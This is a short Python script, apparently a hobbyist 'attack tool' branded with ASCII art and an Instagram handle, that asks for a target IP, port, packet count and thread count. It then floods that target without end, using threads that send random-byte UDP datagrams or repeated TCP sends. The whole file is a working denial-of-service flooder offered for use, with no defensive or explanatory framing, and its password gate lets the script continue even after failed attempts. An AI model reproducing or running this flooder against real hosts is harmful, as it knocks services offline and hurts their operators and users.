#!/usr/bin/env python3
#AustinFennix
import time
import random
import socket
import threading
import os

os.system("clear")
password ="AUSTIN"

for i in range(3):
	pwd = input("[•] PASSWORD: ")
	j=3
	if(pwd==password):
		time.sleep(2)
		print("[•] WAIT BITCH !!! ")
		break
	else:
		time.sleep(5)
		print("[×] WRONG PASSWORD LOL:0 ")
		continue
time.sleep(2)
print("{...} Wait.... ")
time.sleep(2)
print(" <XX------------->")
time.sleep(2)
print(" <XXXXXX--------->")
time.sleep(2)
print(" <XXXXXXXXXXXX--->")
time.sleep(2)
print(" <XXXXXXXXXXXXXXX>")
time.sleep(2)
print(" <SUCCESSFUL!!!> ")
time.sleep(5)
print("------------------------------------------------------------")
print("░█████╗░██╗░░░██╗░██████╗████████╗██╗███╗░░██╗")
print("██╔══██╗██║░░░██║██╔════╝╚══██╔══╝██║████╗░██║")
print("███████║██║░░░██║╚█████╗░░░░██║░░░██║██╔██╗██║")
print("██╔══██║██║░░░██║░╚═══██╗░░░██║░░░██║██║╚████║")
print("██║░░██║╚██████╔╝██████╔╝░░░██║░░░██║██║░╚███║")
print("╚═╝░░╚═╝░╚═════╝░╚═════╝░░░░╚═╝░░░╚═╝╚═╝░░╚══╝")
print("<TOOLS BY AUSTIN>")
print("<FOLLOW MY IG : @TDYFNNX_ >")
print("------------------------------------------------------------")
ip = str(input(" Austin | Ip:"))
port = int(input(" Austin | Port:"))
choice = str(input(" Austin | Attack?(y/n):"))
times = int(input(" Austin | Packets:"))
threads = int(input(" Austin | Threads:"))
def run():
	data = random._urandom(1080)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Austin is Here ")
		except:
			print("[!] Puts Your Hands UP! ")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Austin is Here ")
		except:
			s.close()
			print("[*] Puts Yout Hands UP! ")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()